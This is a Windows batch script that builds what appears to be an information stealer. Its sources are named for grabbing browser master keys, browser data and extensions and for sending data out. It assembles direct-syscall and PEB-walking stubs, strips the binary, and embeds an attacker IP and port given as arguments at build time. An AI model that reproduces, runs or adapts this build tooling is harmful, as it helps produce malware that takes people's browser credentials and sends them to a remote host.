@echo off
setlocal

REM SET THE NEEDED VARIABLES
set "CCX64=x86_64-w64-mingw32-gcc"
set "INCLUDE_DIR=-Iinclude"
set "CFLAGS=-Os -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -s -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fpermissive -fPIC -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections"
set "CSRC=src/decoding.c src/MasterKeyGrabber.c src/ExtensionsGrabber.c src/SendData.c src/DllOps.c src/FileIO.c src/MemoryUtils.c src/BrowserGrabber.c src/hashing.c src/StringUtils.c src/main.c src/DirectoryOps.c src/globals.c src/AddrResolution.c src/PathOps.c"
set "ASMSRC=src/asm/syscalls.asm src/asm/GetPeb.asm src/asm/NtAllocateCallBack.asm src/asm/LdrLoadDllCallBack.asm"
set "OBJ=decoding.o MasterKeyGrabber.o ExtensionsGrabber.o SendData.o DllOps.o FileIO.o MemoryUtils.o BrowserGrabber.o hashing.o StringUtils.o main.o DirectoryOps.o globals.o AddrResolution.o PathOps.o LdrLoadDllCallBack.o syscalls.o NtAllocateCallBack.o GetPeb.o"
set "TARGET=bin\main.exe"

REM SET IP AND PORT
%CCX64% build-tools\tobytes.c -o convert.exe -lws2_32
python build-tools\set.py %1 %2
if %errorlevel% neq 0 (
    del /q utils\convert.exe
    exit /b 1
)

REM ASSEMBLE THE ASSEMBLY FILES TO OBJECT FILES
for %%i in (%ASMSRC%) do (
    nasm -f win64 %%i -o %%~ni.o
)

REM COMPILE THE C FILES TO OBJECT FILES
for %%i in (%CSRC%) do (
    %CCX64% %CFLAGS% %INCLUDE_DIR% -c %%i -o %%~ni.o
)

REM LINK EVERYTHING INTO FINAL EXECUTABLE
%CCX64% %OBJ% %CFLAGS% -o %TARGET%

REM CLEAN BY DELETING ALL THE OBJECT FILES
python build-tools\set.py back
del /q %OBJ%
del /q convert.exe